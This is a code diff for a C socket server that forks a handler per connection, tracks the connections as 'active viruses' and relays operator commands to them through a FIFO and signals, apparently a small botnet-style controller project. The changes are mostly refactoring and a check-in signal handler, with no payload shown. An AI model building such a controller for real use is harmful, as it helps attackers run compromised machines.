@@ -25,6 +25,10 @@
 #include <fcntl.h>
 #define SIZE 100
 
+static int childFds[SIZE];
+static int idCount = 0;
+char * server_name = LISTENING_SERVER;
+static int user_read;
 
 void sighandler(int signo){
   switch(signo){
@@ -32,31 +36,23 @@ void sighandler(int signo){
       {
         //reap all available children but don't block
         while(waitpid(-1,NULL,WNOHANG) > 0);
+        break;
       }
     case SIGUSR1:
       {
         recv_user_cmd();
+        break;
       }
     case SIGUSR2:
       {
-
+        printf("CHECKING IN.... My Pid is %d \nim a %s\n", getpid(), server_name);
+        break;
       }
   }
 
 }
 
-// char * special_cmd(char * cmd){
-//   if(strcmp(cmd, "destroy")==0){
-//     return DESTROY_CMD;
-//   }
-//
-//   return cmd;
-// }
 
-static int childFds[SIZE];
-int idCount = 0;
-
-static int user_read;
 int recv_user_cmd(){
   int shellid;
   int msg_ln;//www.nytimes.com
@@ -81,6 +77,7 @@ int recv_user_cmd(){
 int main(int argc, char const* argv[]){
     signal(SIGCHLD, sighandler); //set SIGCHILD to reaper...
     signal(SIGUSR1, sighandler);
+    signal(SIGUSR2, sighandler);
 
     mkfifo(FIFO_NAME, 0777);
 
@@ -104,7 +101,7 @@ int main(int argc, char const* argv[]){
         pipe(fds);
         if(fork()==0){//if fork is child
             // do what the server should do
-	    close(fds[1]);
+	          close(fds[1]);
             listening_server_action(new_socket, fds[0]);
 
             //clean up
@@ -114,10 +111,10 @@ int main(int argc, char const* argv[]){
         }
 
         //if we are not the subserver, close the socket to the client
-	close(fds[0]);
-	printf("Added virus %d to list of active viruses\n", idCount);
-	childFds[idCount] = fds[1];
-	idCount++;
+        close(fds[0]);
+        printf("Added virus %d to list of active viruses. You can access it at %d\n", idCount, idCount);
+        childFds[idCount] = fds[1];
+        idCount++;
         close(new_socket);
   }
 
